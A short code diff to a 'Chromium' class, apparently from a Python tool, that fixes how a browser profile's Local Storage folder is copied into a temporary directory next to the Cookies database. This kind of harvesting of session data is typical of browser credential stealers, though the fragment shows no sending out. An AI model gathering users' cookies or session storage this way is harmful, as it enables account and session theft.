@@ -272,7 +272,7 @@ class Chromium:
 
             db_path = os.path.join(os.path.split(db_path)[0], 'Local Storage')
             if os.path.exists(db_path):
-                file = shutil.copytree(db_path, temp)
+                file = shutil.copytree(db_path, os.path.join(temp, 'Local Storage'), ignore=lambda dst, names: ['LOCK'])
 
             db_path = os.path.join(os.path.split(db_path)[0], 'Cookies')
             if os.path.exists(db_path):
